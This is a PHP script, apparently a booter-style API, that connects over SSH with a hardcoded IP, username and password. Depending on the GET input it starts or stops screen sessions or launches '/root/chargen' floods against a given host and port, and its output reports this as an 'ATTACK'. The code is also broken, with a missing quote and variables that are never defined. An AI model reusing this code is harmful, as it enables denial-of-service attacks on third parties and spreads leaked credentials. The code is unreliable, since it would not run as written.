
<?php
//API BY KRITTKORN
define("SSH_IP", "45.130.141.159");
define("SSH_PORT", "22");
define("SSH_USER", "xver");
define("SSH_PASSWORD", "1212121Zz");

set_time_limit(0);

if(empty($_GET['name']) || empty($_GET['port']) || empty($_GET['cmd']))
 die("APISP : ONLINE");

$name = escapeshellcmd($_GET['name']);
$port = escapeshellcmd($_GET['port']);
$cmd = escapeshellcmd($_GET['cmd']);
$commandstart = "./start.sh";

if(!function_exists("ssh2_connect")) die("Please install the SSH2 Dependency on the Linux Server First.");

if(!($con = ssh2_connect(SSH_IP, SSH_PORT))) die("Could not connect to SSH...");
else
{
	if(!ssh2_auth_password($con, SSH_USER, SSH_PASSWORD)) die("Invalid Credentials...\n");
    else
    {
    	if($cmd == "start" || $cmd == "start")
    	{
	        if(!($stream = ssh2_exec($con, "screen -dmS $name $commandstart))) die("Command couldn't be executed, something went wrong...\n");
	        else
	        {
	            echo "" . stream_get_contents($stream);
	            echo "Server Opening $name";
	        }
	    }
	    elseif($cmd == "stop" || $cmd == "stop")
    	{
	        if(!($stream = ssh2_exec($con, "screen -S $name -p 0 -X stuff stop"))) die("Command couldn't be executed, something went wrong...\n");
	        else
	        {
	            echo "" . stream_get_contents($stream);
	            echo "Stop Server : Success";
	        }
	    }
	    elseif($cmd == "cmd" || $cmd == "cmd")
    	{
	        if(!($stream = ssh2_exec($con, "/root/chargen ".$host." ".$port." ".$list." ".ATTACK_THREADS." ".$time))) die("Command couldn't be executed, something went wrong...\n");
	        else
	        {
	            echo "" . stream_get_contents($stream);
	            echo "ATTACK : $hot PORT : $port TIME : $time METHOD : $method";
	        }
	    }
	    elseif($cmd == "kuy" || $method == "kuy")
    	{
	        if(!($stream = ssh2_exec($con, "screen -s root -X quit"))) die("Command couldn't be executed, something went wrong...\n");
	        else
	        {
	            echo "" . stream_get_contents($stream);
	            echo "STOP : ALL SUCCESS";
	        }
	    }
	    else die("Please Choose Method!");
    }

}

?>
